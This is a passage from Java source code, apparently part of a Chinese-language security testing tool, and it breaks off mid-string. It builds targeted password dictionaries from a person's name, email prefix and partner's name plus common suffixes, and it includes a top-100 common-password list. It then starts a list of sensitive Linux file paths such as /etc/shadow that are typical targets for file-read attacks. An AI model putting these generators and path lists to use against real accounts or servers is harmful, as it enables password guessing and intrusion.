        String[] name_sz = {"#特殊数字#123123","#特殊数字#123123.","#特殊数字#123123123","#特殊数字#123123123.","#特殊数字#112233","#特殊数字#112233.","#特殊数字#445566","#特殊数字#445566.","#特殊数字#456456","#特殊数字#456456.","#特殊数字#778899","#特殊数字#778899.","#特殊数字#789789","#特殊数字#789789.","#特殊数字#321321","#特殊数字#321321.","#特殊数字#520","#特殊数字#520.","#特殊数字#1314","#特殊数字#1314.","#特殊数字#5201314","#特殊数字#5201314.","#特殊数字#1314520","#特殊数字#1314520.","#特殊数字#147369","#特殊数字#147369.","#特殊数字#258","#特殊数字#258.","#特殊数字#147","#特殊数字#147.","#特殊数字#456","#特殊数字#456.","#特殊数字#789","#特殊数字#789.","#特殊数字#147258369","#特殊数字#147258369.","#特殊数字#111222","#特殊数字#111222.","#特殊数字#1","#特殊数字#1.","#特殊数字#12","#特殊数字#12.","#特殊数字#123","#特殊数字#123.","#特殊数字#1234","#特殊数字#1234.","#特殊数字#123456","#特殊数字#123456.","#特殊数字#1234567","#特殊数字#1234567.","#特殊数字#12345678","#特殊数字#12345678.","#特殊数字#123456789","#特殊数字#123456789.","#特殊数字#987654321","#特殊数字#978654321.","#特殊数字#978654321","#特殊数字#87654321","#特殊数字#78654321.","#特殊数字#78654321","#特殊数字#7654321","#特殊数字#8654321.","#特殊数字#8654321","#特殊数字#654321","#特殊数字#654321.","#特殊数字#54321","#特殊数字#54321.","#特殊数字#4321","#特殊数字#4321.","#特殊数字#321","#特殊数字#321.","#特殊数字#21","#特殊数字#21.","#特殊数字#11","#特殊数字#11.","#特殊数字#111","#特殊数字#111.","#特殊数字#1111","#特殊数字#1111.","#特殊数字#11111","#特殊数字#11111.","#特殊数字#111111","#特殊数字#111111.","#特殊数字#1111111","#特殊数字#1111111.","#特殊数字#11111111","#特殊数字#11111111.","#特殊数字#2","#特殊数字#2.","#特殊数字#22","#特殊数字#22.","#特殊数字#222","#特殊数字#222.","#特殊数字#2222","#特殊数字#2222.","#特殊数字#22222","#特殊数字#22222.","#特殊数字#222222","#特殊数字#222222.","#特殊数字#2222222","#特殊数字#2222222.","#特殊数字#22222222","#特殊数字#22222222.","#特殊数字#33","#特殊数字#33.","#特殊数字#333","#特殊数字#333.","#特殊数字#3333","#特殊数字#3333.","#特殊数字#33333","#特殊数字#33333.","#特殊数字#333333","#特殊数字#333333.","#特殊数字#3333333","#特殊数字#3333333.","#特殊数字#33333333","#特殊数字#33333333.","#特殊数字#44","#特殊数字#44.","#特殊数字#444","#特殊数字#444.","#特殊数字#4444","#特殊数字#4444.","#特殊数字#44444","#特殊数字#44444.","#特殊数字#444444","#特殊数字#444444.","#特殊数字#4444444","#特殊数字#4444444.","#特殊数字#44444444","#特殊数字#44444444.","#特殊数字#55","#特殊数字#55.","#特殊数字#555","#特殊数字#555.","#特殊数字#5555","#特殊数字#5555.","#特殊数字#55555","#特殊数字#55555.","#特殊数字#555555","#特殊数字#555555.","#特殊数字#5555555","#特殊数字#5555555.","#特殊数字#55555555","#特殊数字#55555555.","#特殊数字#66","#特殊数字#66.","#特殊数字#666","#特殊数字#666.","#特殊数字#6666","#特殊数字#6666.","#特殊数字#66666","#特殊数字#66666.","#特殊数字#666666","#特殊数字#666666.","#特殊数字#6666666","#特殊数字#6666666.","#特殊数字#66666666","#特殊数字#66666666.","#特殊数字#77","#特殊数字#77.","#特殊数字#777","#特殊数字#777.","#特殊数字#7777","#特殊数字#7777.","#特殊数字#77777","#特殊数字#77777.","#特殊数字#777777","#特殊数字#777777.","#特殊数字#7777777","#特殊数字#7777777.","#特殊数字#77777777","#特殊数字#77777777.","#特殊数字#88","#特殊数字#88.","#特殊数字#888","#特殊数字#888.","#特殊数字#8888","#特殊数字#8888.","#特殊数字#88888","#特殊数字#88888.","#特殊数字#888888","#特殊数字#888888.","#特殊数字#8888888","#特殊数字#8888888.","#特殊数字#88888888","#特殊数字#88888888.","#特殊数字#99","#特殊数字#99.","#特殊数字#999","#特殊数字#999.","#特殊数字#9999","#特殊数字#9999.","#特殊数字#99999","#特殊数字#99999.","#特殊数字#999999","#特殊数字#999999.","#特殊数字#9999999","#特殊数字#9999999.","#特殊数字#99999999","#特殊数字#99999999.","#特殊数字#00","#特殊数字#00.","#特殊数字#000","#特殊数字#000.","#特殊数字#0000","#特殊数字#0000.","#特殊数字#00000","#特殊数字#00000.","#特殊数字#000000","#特殊数字#000000.","#特殊数字#0000000","#特殊数字#0000000.","#特殊数字#00000000","#特殊数字#00000000.","#特殊数字#1997","#特殊数字#1997.","#特殊数字#1998","#特殊数字#1998.","#特殊数字#1999","#特殊数字#1999.","#特殊数字#2000","#特殊数字#2000.","#特殊数字#2001","#特殊数字#2001.","#特殊数字#2002","#特殊数字#2002.","#特殊数字#2003","#特殊数字#2003.","#特殊数字#2004","#特殊数字#2004.","#特殊数字#2005","#特殊数字#2005.","#特殊数字#2006","#特殊数字#2006.","#特殊数字#2007","#特殊数字#2007.","#特殊数字#2008","#特殊数字#2008.","#特殊数字#2009","#特殊数字#2009.","#特殊数字#2010","#特殊数字#2010.","#特殊数字#2011","#特殊数字#2011.","#特殊数字#2012","#特殊数字#2012.","#特殊数字#2013","#特殊数字#2013.","#特殊数字#2014","#特殊数字#2014.","#特殊数字#2015","#特殊数字#2015.","#特殊数字#2016","#特殊数字#2016.","#特殊数字#2017","#特殊数字#2017.","#特殊数字#2018","#特殊数字#2018.","#特殊数字#2019","#特殊数字#2019.","#特殊数字#2020","#特殊数字#2020.","#特殊数字#2021","#特殊数字#2021.","#特殊数字#2022","#特殊数字#2022.","#特殊数字#2023","#特殊数字#2023."};
        //邮箱前缀
        String[] name_yx = {"520#邮箱前缀#","520#邮箱前缀#.","#邮箱前缀#123123","#邮箱前缀#123123.","#邮箱前缀#123123123","#邮箱前缀#123123123.","#邮箱前缀#112233","#邮箱前缀#112233.","#邮箱前缀#445566","#邮箱前缀#445566.","#邮箱前缀#456456","#邮箱前缀#456456.","#邮箱前缀#778899","#邮箱前缀#778899.","#邮箱前缀#789789","#邮箱前缀#789789.","#邮箱前缀#321321","#邮箱前缀#321321.","#邮箱前缀#520","#邮箱前缀#520.","#邮箱前缀#1314","#邮箱前缀#1314.","#邮箱前缀#5201314","#邮箱前缀#5201314.","#邮箱前缀#1314520","#邮箱前缀#1314520.","#邮箱前缀#147369","#邮箱前缀#147369.","#邮箱前缀#258","#邮箱前缀#258.","#邮箱前缀#147","#邮箱前缀#147.","#邮箱前缀#456","#邮箱前缀#456.","#邮箱前缀#789","#邮箱前缀#789.","#邮箱前缀#147258369","#邮箱前缀#147258369.","#邮箱前缀#111222","#邮箱前缀#111222.","#邮箱前缀#1","#邮箱前缀#1.","#邮箱前缀#12","#邮箱前缀#12.","#邮箱前缀#123","#邮箱前缀#123.","#邮箱前缀#1234","#邮箱前缀#1234.","#邮箱前缀#123456","#邮箱前缀#123456.","#邮箱前缀#1234567","#邮箱前缀#1234567.","#邮箱前缀#12345678","#邮箱前缀#12345678.","#邮箱前缀#123456789","#邮箱前缀#123456789.","#邮箱前缀#987654321","#邮箱前缀#978654321.","#邮箱前缀#978654321","#邮箱前缀#87654321","#邮箱前缀#78654321.","#邮箱前缀#78654321","#邮箱前缀#7654321","#邮箱前缀#8654321.","#邮箱前缀#8654321","#邮箱前缀#654321","#邮箱前缀#654321.","#邮箱前缀#54321","#邮箱前缀#54321.","#邮箱前缀#4321","#邮箱前缀#4321.","#邮箱前缀#321","#邮箱前缀#321.","#邮箱前缀#21","#邮箱前缀#21.","#邮箱前缀#11","#邮箱前缀#11.","#邮箱前缀#111","#邮箱前缀#111.","#邮箱前缀#1111","#邮箱前缀#1111.","#邮箱前缀#11111","#邮箱前缀#11111.","#邮箱前缀#111111","#邮箱前缀#111111.","#邮箱前缀#1111111","#邮箱前缀#1111111.","#邮箱前缀#11111111","#邮箱前缀#11111111.","#邮箱前缀#2","#邮箱前缀#2.","#邮箱前缀#22","#邮箱前缀#22.","#邮箱前缀#222","#邮箱前缀#222.","#邮箱前缀#2222","#邮箱前缀#2222.","#邮箱前缀#22222","#邮箱前缀#22222.","#邮箱前缀#222222","#邮箱前缀#222222.","#邮箱前缀#2222222","#邮箱前缀#2222222.","#邮箱前缀#22222222","#邮箱前缀#22222222.","#邮箱前缀#33","#邮箱前缀#33.","#邮箱前缀#333","#邮箱前缀#333.","#邮箱前缀#3333","#邮箱前缀#3333.","#邮箱前缀#33333","#邮箱前缀#33333.","#邮箱前缀#333333","#邮箱前缀#333333.","#邮箱前缀#3333333","#邮箱前缀#3333333.","#邮箱前缀#33333333","#邮箱前缀#33333333.","#邮箱前缀#44","#邮箱前缀#44.","#邮箱前缀#444","#邮箱前缀#444.","#邮箱前缀#4444","#邮箱前缀#4444.","#邮箱前缀#44444","#邮箱前缀#44444.","#邮箱前缀#444444","#邮箱前缀#444444.","#邮箱前缀#4444444","#邮箱前缀#4444444.","#邮箱前缀#44444444","#邮箱前缀#44444444.","#邮箱前缀#55","#邮箱前缀#55.","#邮箱前缀#555","#邮箱前缀#555.","#邮箱前缀#5555","#邮箱前缀#5555.","#邮箱前缀#55555","#邮箱前缀#55555.","#邮箱前缀#555555","#邮箱前缀#555555.","#邮箱前缀#5555555","#邮箱前缀#5555555.","#邮箱前缀#55555555","#邮箱前缀#55555555.","#邮箱前缀#66","#邮箱前缀#66.","#邮箱前缀#666","#邮箱前缀#666.","#邮箱前缀#6666","#邮箱前缀#6666.","#邮箱前缀#66666","#邮箱前缀#66666.","#邮箱前缀#666666","#邮箱前缀#666666.","#邮箱前缀#6666666","#邮箱前缀#6666666.","#邮箱前缀#66666666","#邮箱前缀#66666666.","#邮箱前缀#77","#邮箱前缀#77.","#邮箱前缀#777","#邮箱前缀#777.","#邮箱前缀#7777","#邮箱前缀#7777.","#邮箱前缀#77777","#邮箱前缀#77777.","#邮箱前缀#777777","#邮箱前缀#777777.","#邮箱前缀#7777777","#邮箱前缀#7777777.","#邮箱前缀#77777777","#邮箱前缀#77777777.","#邮箱前缀#88","#邮箱前缀#88.","#邮箱前缀#888","#邮箱前缀#888.","#邮箱前缀#8888","#邮箱前缀#8888.","#邮箱前缀#88888","#邮箱前缀#88888.","#邮箱前缀#888888","#邮箱前缀#888888.","#邮箱前缀#8888888","#邮箱前缀#8888888.","#邮箱前缀#88888888","#邮箱前缀#88888888.","#邮箱前缀#99","#邮箱前缀#99.","#邮箱前缀#999","#邮箱前缀#999.","#邮箱前缀#9999","#邮箱前缀#9999.","#邮箱前缀#99999","#邮箱前缀#99999.","#邮箱前缀#999999","#邮箱前缀#999999.","#邮箱前缀#9999999","#邮箱前缀#9999999.","#邮箱前缀#99999999","#邮箱前缀#99999999.","#邮箱前缀#00","#邮箱前缀#00.","#邮箱前缀#000","#邮箱前缀#000.","#邮箱前缀#0000","#邮箱前缀#0000.","#邮箱前缀#00000","#邮箱前缀#00000.","#邮箱前缀#000000","#邮箱前缀#000000.","#邮箱前缀#0000000","#邮箱前缀#0000000.","#邮箱前缀#00000000","#邮箱前缀#00000000.","#邮箱前缀#1997","#邮箱前缀#1997.","#邮箱前缀#1998","#邮箱前缀#1998.","#邮箱前缀#1999","#邮箱前缀#1999.","#邮箱前缀#2000","#邮箱前缀#2000.","#邮箱前缀#2001","#邮箱前缀#2001.","#邮箱前缀#2002","#邮箱前缀#2002.","#邮箱前缀#2003","#邮箱前缀#2003.","#邮箱前缀#2004","#邮箱前缀#2004.","#邮箱前缀#2005","#邮箱前缀#2005.","#邮箱前缀#2006","#邮箱前缀#2006.","#邮箱前缀#2007","#邮箱前缀#2007.","#邮箱前缀#2008","#邮箱前缀#2008.","#邮箱前缀#2009","#邮箱前缀#2009.","#邮箱前缀#2010","#邮箱前缀#2010.","#邮箱前缀#2011","#邮箱前缀#2011.","#邮箱前缀#2012","#邮箱前缀#2012.","#邮箱前缀#2013","#邮箱前缀#2013.","#邮箱前缀#2014","#邮箱前缀#2014.","#邮箱前缀#2015","#邮箱前缀#2015.","#邮箱前缀#2016","#邮箱前缀#2016.","#邮箱前缀#2017","#邮箱前缀#2017.","#邮箱前缀#2018","#邮箱前缀#2018.","#邮箱前缀#2019","#邮箱前缀#2019.","#邮箱前缀#2020","#邮箱前缀#2020.","#邮箱前缀#2021","#邮箱前缀#2021.","#邮箱前缀#2022","#邮箱前缀#2022.","#邮箱前缀#2023","#邮箱前缀#2023."};
        //伴侣简称
        String[] name_bljc = {"520#伴侣简称#","520#伴侣简称#.","5201314#伴侣简称#","5201314#伴侣简称#.","1314#伴侣简称#","1314#伴侣简称#.","#伴侣简称#520","#伴侣简称#520.","#伴侣简称#5201314","#伴侣简称#5201314.","#伴侣简称#1314","#伴侣简称#1314.","#伴侣简称#loveu","#伴侣简称#loveu.","#伴侣简称#loveyou","#伴侣简称#loveyou.","#伴侣简称#LOVEU","#伴侣简称#LOVEU.","#伴侣简称#LOVEYOU","#伴侣简称#LOVEYOU.","#伴侣简称#123123","#伴侣简称#123123.","#伴侣简称#123123123","#伴侣简称#123123123.","#伴侣简称#112233","#伴侣简称#112233.","#伴侣简称#445566","#伴侣简称#445566.","#伴侣简称#456456","#伴侣简称#456456.","#伴侣简称#778899","#伴侣简称#778899.","#伴侣简称#789789","#伴侣简称#789789.","#伴侣简称#321321","#伴侣简称#321321.","#伴侣简称#1314520","#伴侣简称#1314520.","#伴侣简称#147369","#伴侣简称#147369.","#伴侣简称#258","#伴侣简称#258.","#伴侣简称#147","#伴侣简称#147.","#伴侣简称#456","#伴侣简称#456.","#伴侣简称#789","#伴侣简称#789.","#伴侣简称#147258369","#伴侣简称#147258369.","#伴侣简称#111222","#伴侣简称#111222.","#伴侣简称#1","#伴侣简称#1.","#伴侣简称#12","#伴侣简称#12.","#伴侣简称#123","#伴侣简称#123.","#伴侣简称#1234","#伴侣简称#1234.","#伴侣简称#123456","#伴侣简称#123456.","#伴侣简称#1234567","#伴侣简称#1234567.","#伴侣简称#12345678","#伴侣简称#12345678.","#伴侣简称#123456789","#伴侣简称#123456789.","#伴侣简称#987654321","#伴侣简称#978654321.","#伴侣简称#978654321","#伴侣简称#87654321","#伴侣简称#78654321.","#伴侣简称#78654321","#伴侣简称#7654321","#伴侣简称#8654321.","#伴侣简称#8654321","#伴侣简称#654321","#伴侣简称#654321.","#伴侣简称#54321","#伴侣简称#54321.","#伴侣简称#4321","#伴侣简称#4321.","#伴侣简称#321","#伴侣简称#321.","#伴侣简称#21","#伴侣简称#21.","#伴侣简称#11","#伴侣简称#11.","#伴侣简称#111","#伴侣简称#111.","#伴侣简称#1111","#伴侣简称#1111.","#伴侣简称#11111","#伴侣简称#11111.","#伴侣简称#111111","#伴侣简称#111111.","#伴侣简称#1111111","#伴侣简称#1111111.","#伴侣简称#11111111","#伴侣简称#11111111.","#伴侣简称#2","#伴侣简称#2.","#伴侣简称#22","#伴侣简称#22.","#伴侣简称#222","#伴侣简称#222.","#伴侣简称#2222","#伴侣简称#2222.","#伴侣简称#22222","#伴侣简称#22222.","#伴侣简称#222222","#伴侣简称#222222.","#伴侣简称#2222222","#伴侣简称#2222222.","#伴侣简称#22222222","#伴侣简称#22222222.","#伴侣简称#33","#伴侣简称#33.","#伴侣简称#333","#伴侣简称#333.","#伴侣简称#3333","#伴侣简称#3333.","#伴侣简称#33333","#伴侣简称#33333.","#伴侣简称#333333","#伴侣简称#333333.","#伴侣简称#3333333","#伴侣简称#3333333.","#伴侣简称#33333333","#伴侣简称#33333333.","#伴侣简称#44","#伴侣简称#44.","#伴侣简称#444","#伴侣简称#444.","#伴侣简称#4444","#伴侣简称#4444.","#伴侣简称#44444","#伴侣简称#44444.","#伴侣简称#444444","#伴侣简称#444444.","#伴侣简称#4444444","#伴侣简称#4444444.","#伴侣简称#44444444","#伴侣简称#44444444.","#伴侣简称#55","#伴侣简称#55.","#伴侣简称#555","#伴侣简称#555.","#伴侣简称#5555","#伴侣简称#5555.","#伴侣简称#55555","#伴侣简称#55555.","#伴侣简称#555555","#伴侣简称#555555.","#伴侣简称#5555555","#伴侣简称#5555555.","#伴侣简称#55555555","#伴侣简称#55555555.","#伴侣简称#66","#伴侣简称#66.","#伴侣简称#666","#伴侣简称#666.","#伴侣简称#6666","#伴侣简称#6666.","#伴侣简称#66666","#伴侣简称#66666.","#伴侣简称#666666","#伴侣简称#666666.","#伴侣简称#6666666","#伴侣简称#6666666.","#伴侣简称#66666666","#伴侣简称#66666666.","#伴侣简称#77","#伴侣简称#77.","#伴侣简称#777","#伴侣简称#777.","#伴侣简称#7777","#伴侣简称#7777.","#伴侣简称#77777","#伴侣简称#77777.","#伴侣简称#777777","#伴侣简称#777777.","#伴侣简称#7777777","#伴侣简称#7777777.","#伴侣简称#77777777","#伴侣简称#77777777.","#伴侣简称#88","#伴侣简称#88.","#伴侣简称#888","#伴侣简称#888.","#伴侣简称#8888","#伴侣简称#8888.","#伴侣简称#88888","#伴侣简称#88888.","#伴侣简称#888888","#伴侣简称#888888.","#伴侣简称#8888888","#伴侣简称#8888888.","#伴侣简称#88888888","#伴侣简称#88888888.","#伴侣简称#99","#伴侣简称#99.","#伴侣简称#999","#伴侣简称#999.","#伴侣简称#9999","#伴侣简称#9999.","#伴侣简称#99999","#伴侣简称#99999.","#伴侣简称#999999","#伴侣简称#999999.","#伴侣简称#9999999","#伴侣简称#9999999.","#伴侣简称#99999999","#伴侣简称#99999999.","#伴侣简称#00","#伴侣简称#00.","#伴侣简称#000","#伴侣简称#000.","#伴侣简称#0000","#伴侣简称#0000.","#伴侣简称#00000","#伴侣简称#00000.","#伴侣简称#000000","#伴侣简称#000000.","#伴侣简称#0000000","#伴侣简称#0000000.","#伴侣简称#00000000","#伴侣简称#00000000.","#伴侣简称#1997","#伴侣简称#1997.","#伴侣简称#1998","#伴侣简称#1998.","#伴侣简称#1999","#伴侣简称#1999.","#伴侣简称#2000","#伴侣简称#2000.","#伴侣简称#2001","#伴侣简称#2001.","#伴侣简称#2002","#伴侣简称#2002.","#伴侣简称#2003","#伴侣简称#2003.","#伴侣简称#2004","#伴侣简称#2004.","#伴侣简称#2005","#伴侣简称#2005.","#伴侣简称#2006","#伴侣简称#2006.","#伴侣简称#2007","#伴侣简称#2007.","#伴侣简称#2008","#伴侣简称#2008.","#伴侣简称#2009","#伴侣简称#2009.","#伴侣简称#2010","#伴侣简称#2010.","#伴侣简称#2011","#伴侣简称#2011.","#伴侣简称#2012","#伴侣简称#2012.","#伴侣简称#2013","#伴侣简称#2013.","#伴侣简称#2014","#伴侣简称#2014.","#伴侣简称#2015","#伴侣简称#2015.","#伴侣简称#2016","#伴侣简称#2016.","#伴侣简称#2017","#伴侣简称#2017.","#伴侣简称#2018","#伴侣简称#2018.","#伴侣简称#2019","#伴侣简称#2019.","#伴侣简称#2020","#伴侣简称#2020.","#伴侣简称#2021","#伴侣简称#2021.","#伴侣简称#2022","#伴侣简称#2022.","#伴侣简称#2023","#伴侣简称#2023."};
        //伴侣全称
        String[] name_blqc = {"520#伴侣全程#","520#伴侣全程#.","5201314#伴侣全程#","5201314#伴侣全程#.","1314#伴侣全程#","1314#伴侣全程#.","#伴侣全程#520","#伴侣全程#520.","#伴侣全程#5201314","#伴侣全程#5201314.","#伴侣全程#1314","#伴侣全程#1314.","#伴侣全程#loveu","#伴侣全程#loveu.","#伴侣全程#loveyou","#伴侣全程#loveyou.","#伴侣全程#LOVEU","#伴侣全程#LOVEU.","#伴侣全程#LOVEYOU","#伴侣全程#LOVEYOU.","#伴侣全程#123123","#伴侣全程#123123.","#伴侣全程#123123123","#伴侣全程#123123123.","#伴侣全程#112233","#伴侣全程#112233.","#伴侣全程#445566","#伴侣全程#445566.","#伴侣全程#456456","#伴侣全程#456456.","#伴侣全程#778899","#伴侣全程#778899.","#伴侣全程#789789","#伴侣全程#789789.","#伴侣全程#321321","#伴侣全程#321321.","#伴侣全程#1314520","#伴侣全程#1314520.","#伴侣全程#147369","#伴侣全程#147369.","#伴侣全程#258","#伴侣全程#258.","#伴侣全程#147","#伴侣全程#147.","#伴侣全程#456","#伴侣全程#456.","#伴侣全程#789","#伴侣全程#789.","#伴侣全程#147258369","#伴侣全程#147258369.","#伴侣全程#111222","#伴侣全程#111222.","#伴侣全程#1","#伴侣全程#1.","#伴侣全程#12","#伴侣全程#12.","#伴侣全程#123","#伴侣全程#123.","#伴侣全程#1234","#伴侣全程#1234.","#伴侣全程#123456","#伴侣全程#123456.","#伴侣全程#1234567","#伴侣全程#1234567.","#伴侣全程#12345678","#伴侣全程#12345678.","#伴侣全程#123456789","#伴侣全程#123456789.","#伴侣全程#987654321","#伴侣全程#978654321.","#伴侣全程#978654321","#伴侣全程#87654321","#伴侣全程#78654321.","#伴侣全程#78654321","#伴侣全程#7654321","#伴侣全程#8654321.","#伴侣全程#8654321","#伴侣全程#654321","#伴侣全程#654321.","#伴侣全程#54321","#伴侣全程#54321.","#伴侣全程#4321","#伴侣全程#4321.","#伴侣全程#321","#伴侣全程#321.","#伴侣全程#21","#伴侣全程#21.","#伴侣全程#11","#伴侣全程#11.","#伴侣全程#111","#伴侣全程#111.","#伴侣全程#1111","#伴侣全程#1111.","#伴侣全程#11111","#伴侣全程#11111.","#伴侣全程#111111","#伴侣全程#111111.","#伴侣全程#1111111","#伴侣全程#1111111.","#伴侣全程#11111111","#伴侣全程#11111111.","#伴侣全程#2","#伴侣全程#2.","#伴侣全程#22","#伴侣全程#22.","#伴侣全程#222","#伴侣全程#222.","#伴侣全程#2222","#伴侣全程#2222.","#伴侣全程#22222","#伴侣全程#22222.","#伴侣全程#222222","#伴侣全程#222222.","#伴侣全程#2222222","#伴侣全程#2222222.","#伴侣全程#22222222","#伴侣全程#22222222.","#伴侣全程#33","#伴侣全程#33.","#伴侣全程#333","#伴侣全程#333.","#伴侣全程#3333","#伴侣全程#3333.","#伴侣全程#33333","#伴侣全程#33333.","#伴侣全程#333333","#伴侣全程#333333.","#伴侣全程#3333333","#伴侣全程#3333333.","#伴侣全程#33333333","#伴侣全程#33333333.","#伴侣全程#44","#伴侣全程#44.","#伴侣全程#444","#伴侣全程#444.","#伴侣全程#4444","#伴侣全程#4444.","#伴侣全程#44444","#伴侣全程#44444.","#伴侣全程#444444","#伴侣全程#444444.","#伴侣全程#4444444","#伴侣全程#4444444.","#伴侣全程#44444444","#伴侣全程#44444444.","#伴侣全程#55","#伴侣全程#55.","#伴侣全程#555","#伴侣全程#555.","#伴侣全程#5555","#伴侣全程#5555.","#伴侣全程#55555","#伴侣全程#55555.","#伴侣全程#555555","#伴侣全程#555555.","#伴侣全程#5555555","#伴侣全程#5555555.","#伴侣全程#55555555","#伴侣全程#55555555.","#伴侣全程#66","#伴侣全程#66.","#伴侣全程#666","#伴侣全程#666.","#伴侣全程#6666","#伴侣全程#6666.","#伴侣全程#66666","#伴侣全程#66666.","#伴侣全程#666666","#伴侣全程#666666.","#伴侣全程#6666666","#伴侣全程#6666666.","#伴侣全程#66666666","#伴侣全程#66666666.","#伴侣全程#77","#伴侣全程#77.","#伴侣全程#777","#伴侣全程#777.","#伴侣全程#7777","#伴侣全程#7777.","#伴侣全程#77777","#伴侣全程#77777.","#伴侣全程#777777","#伴侣全程#777777.","#伴侣全程#7777777","#伴侣全程#7777777.","#伴侣全程#77777777","#伴侣全程#77777777.","#伴侣全程#88","#伴侣全程#88.","#伴侣全程#888","#伴侣全程#888.","#伴侣全程#8888","#伴侣全程#8888.","#伴侣全程#88888","#伴侣全程#88888.","#伴侣全程#888888","#伴侣全程#888888.","#伴侣全程#8888888","#伴侣全程#8888888.","#伴侣全程#88888888","#伴侣全程#88888888.","#伴侣全程#99","#伴侣全程#99.","#伴侣全程#999","#伴侣全程#999.","#伴侣全程#9999","#伴侣全程#9999.","#伴侣全程#99999","#伴侣全程#99999.","#伴侣全程#999999","#伴侣全程#999999.","#伴侣全程#9999999","#伴侣全程#9999999.","#伴侣全程#99999999","#伴侣全程#99999999.","#伴侣全程#00","#伴侣全程#00.","#伴侣全程#000","#伴侣全程#000.","#伴侣全程#0000","#伴侣全程#0000.","#伴侣全程#00000","#伴侣全程#00000.","#伴侣全程#000000","#伴侣全程#000000.","#伴侣全程#0000000","#伴侣全程#0000000.","#伴侣全程#00000000","#伴侣全程#00000000.","#伴侣全程#1997","#伴侣全程#1997.","#伴侣全程#1998","#伴侣全程#1998.","#伴侣全程#1999","#伴侣全程#1999.","#伴侣全程#2000","#伴侣全程#2000.","#伴侣全程#2001","#伴侣全程#2001.","#伴侣全程#2002","#伴侣全程#2002.","#伴侣全程#2003","#伴侣全程#2003.","#伴侣全程#2004","#伴侣全程#2004.","#伴侣全程#2005","#伴侣全程#2005.","#伴侣全程#2006","#伴侣全程#2006.","#伴侣全程#2007","#伴侣全程#2007.","#伴侣全程#2008","#伴侣全程#2008.","#伴侣全程#2009","#伴侣全程#2009.","#伴侣全程#2010","#伴侣全程#2010.","#伴侣全程#2011","#伴侣全程#2011.","#伴侣全程#2012","#伴侣全程#2012.","#伴侣全程#2013","#伴侣全程#2013.","#伴侣全程#2014","#伴侣全程#2014.","#伴侣全程#2015","#伴侣全程#2015.","#伴侣全程#2016","#伴侣全程#2016.","#伴侣全程#2017","#伴侣全程#2017.","#伴侣全程#2018","#伴侣全程#2018.","#伴侣全程#2019","#伴侣全程#2019.","#伴侣全程#2020","#伴侣全程#2020.","#伴侣全程#2021","#伴侣全程#2021.","#伴侣全程#2022","#伴侣全程#2022.","#伴侣全程#2023","#伴侣全程#2023."};
        //top100
        String[] top100 = {"123456","a123456","123456a","5201314","111111","woaini1314","qq123456","123123","000000","1qaz2wsx","1q2w3e4r","qwe123","7758521","123qwe","a123123","123456aa","woaini520","woaini","100200","1314520","woaini123","123321","q123456","123456789","123456789a","5211314","asd123","a123456789","z123456","asd123456","a5201314","aa123456","zhang123","aptx4869","123123a","1q2w3e4r5t","1qazxsw2","5201314a","1q2w3e","aini1314","31415926","q1w2e3r4","123456qq","woaini521","1234qwer","a111111","520520","iloveyou","abc123","110110","111111a","123456abc","w123456","7758258","123qweasd","159753","qwer1234","a000000","qq123123","zxc123","123654","abc123456","123456q","qq5201314","12345678","000000a","456852","as123456","1314521","112233","521521","qazwsx123","zxc123456","abcd1234","asdasd","666666","love1314","QAZ123","aaa123","q1w2e3","aaaaaa","a123321","123000","11111111","12qwaszx","5845201314","s123456","nihao123","caonima123","zxcvbnm123","wang123","159357","1A2B3C4D","asdasd123","584520","753951","147258","1123581321","110120","qq1314520"};


        //写入top100字典
        for(int i=0;i<top100.length;i++){
            data_list.add(top100[i]);
        }

        //替换关键字并导入最后列表中
        if(rkl_tf_0.length()>0){
            for(int i=0;i<name_jc.length;i++){
                data_list.add(name_jc[i].replace("#名字简称#",rkl_tf_0));
            }
        }
        if(rkl_tf_1.length()>0){
            for(int i=0;i<name_qc.length;i++){
                data_list.add(name_qc[i].replace("#名字全拼#",rkl_tf_1));
            }
        }
        if(rkl_tf_2.length()>0){
            for(int i=0;i<name_yw.length;i++){
                data_list.add(name_yw[i].replace("#英文名#",rkl_tf_2));
            }
        }
        if(rkl_tf_3.length()>0){
            for(int i=0;i<name_yhm.length;i++){
                data_list.add(name_yhm[i].replace("#用户名#",rkl_tf_3));
            }
        }
        if(rkl_tf_4.length()>0){
            for(int i=0;i<name_qq.length;i++){
                data_list.add(name_qq[i].replace("#QQ号#",rkl_tf_4));
            }
        }
        if(rkl_tf_5.length()>0){
            for(int i=0;i<name_rq.length;i++){
                data_list.add(name_rq[i].replace("#出生日期#",rkl_tf_5));
            }
        }
        if(rkl_tf_6.length()>0){
            for(int i=0;i<name_sz.length;i++){
                data_list.add(name_sz[i].replace("#特殊数字#",rkl_tf_6));
            }
        }
        if(rkl_tf_7.length()>0){
            for(int i=0;i<name_yx.length;i++){
                data_list.add(name_yx[i].replace("#邮箱前缀#",rkl_tf_7));
            }
        }
        if(rkl_tf_8.length()>0){
            for(int i=0;i<name_bljc.length;i++){
                data_list.add(name_bljc[i].replace("#伴侣简称#",rkl_tf_8));
            }
        }
        if(rkl_tf_9.length()>0){
            for(int i=0;i<name_blqc.length;i++){
                data_list.add(name_blqc[i].replace("#伴侣全程#",rkl_tf_9));
            }
        }

        for(int i=0;i<data_list.size();i++){
            data += data_list.get(i)+"\n";
        }

        rkl_lb_10.setText("一共生成："+data_list.size()+"条字典！");


        return data;



    }

    //linux常见路径
    private String linux_path(){
        String data = "/etc/passwd#/etc/shadow#/etc/fstab#/etc/host.conf#/etc/motd#/etc/ld.so.conf#/var/www/htdocs/index.php#/var/www/conf/httpd.conf#/var/www/htdocs/index.html#/var/httpd/conf/php.ini#/var/httpd/htdocs/index.php#/var/httpd/conf/httpd.conf#/var/httpd/htdocs/index.html#/var/httpd/conf/php.ini#/var/www/index.html#/var/www/index.php#/opt/www/conf/httpd.conf#/opt/www/htdocs/index.php#/opt/www/htdocs/index.html#/usr/local/apache/htdocs/index.html#/usr/local/apache/htdocs/index.php#/usr/local/apache2/htdocs/index.html#/usr/local/apache2/htdocs/index.php#/usr/local/httpd2.2/htdocs/index.php#/usr/local/httpd2.2/htdocs/index.html#/tmp/apache/htdocs/index.html#/tmp/apache/htdocs/index.php#/etc/httpd/htdocs/index.php#/etc/httpd/conf/httpd.conf#/etc/httpd/htdocs/index.html#/www/php/php.ini#/www/php4/php.ini#/www/php5/php.ini#/www/conf/httpd.conf#/www/htdocs/index.php#/www/htdocs/index.html#/usr/local/httpd/conf/httpd.conf#/apache/apache/conf/httpd.conf#/apache/apache2/conf/httpd.conf#/etc/apache/apache.conf#/etc/apache2/apache.conf#/etc/apache/httpd.conf#/etc/apache2/httpd.conf#/etc/apache2/vhosts.d/00_default_vhost.conf#/etc/apache2/sites-available/default#/etc/phpmyadmin/config.inc.php#/etc/mysql/my.cn